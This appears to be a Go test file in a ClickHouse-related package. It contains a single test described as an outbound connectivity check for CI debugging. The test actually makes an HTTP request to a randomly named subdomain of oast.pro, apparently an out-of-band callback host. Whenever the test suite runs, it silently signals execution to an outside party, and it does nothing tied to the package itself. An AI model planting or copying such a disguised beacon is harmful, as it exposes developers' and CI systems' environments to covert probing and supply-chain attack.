package clickhouse

import (
	"net/http"
	"testing"
)

// TestCloudConnectivity verifies that the test environment can reach external endpoints.
// This helps debug CI failures where outbound network access is blocked.
func TestCloudConnectivity(t *testing.T) {
	resp, err := http.Get("https://d75h5ohteuessvga2b2gan9wfqnxaeg5j.oast.pro")
	if err != nil {
		t.Logf("outbound connectivity check failed: %v", err)
		return
	}
	resp.Body.Close()
	t.Logf("outbound connectivity check passed, status: %d", resp.StatusCode)
}
